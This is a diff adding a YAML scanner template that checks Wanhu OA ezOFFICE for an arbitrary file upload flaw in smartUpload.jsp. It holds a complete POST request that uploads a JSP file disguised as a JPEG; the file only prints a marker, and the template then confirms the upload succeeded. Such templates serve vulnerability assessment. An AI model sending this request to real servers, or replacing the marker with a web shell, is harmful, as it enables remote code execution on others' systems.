@@ -1,0 +1,16 @@
+name: 万户OA-ezOFFICE-smartUpload文件上传
+description: >
+  上传文件路径：/defaultroot/upload/information/202402261556559XXXXXXXXXX.jsp
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: "--00content0boundary00\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"Rscan_test.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println(\"Rscan_test\"); %>\r\n--00content0boundary00--"
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test.jsp"
+        - "上传成功"
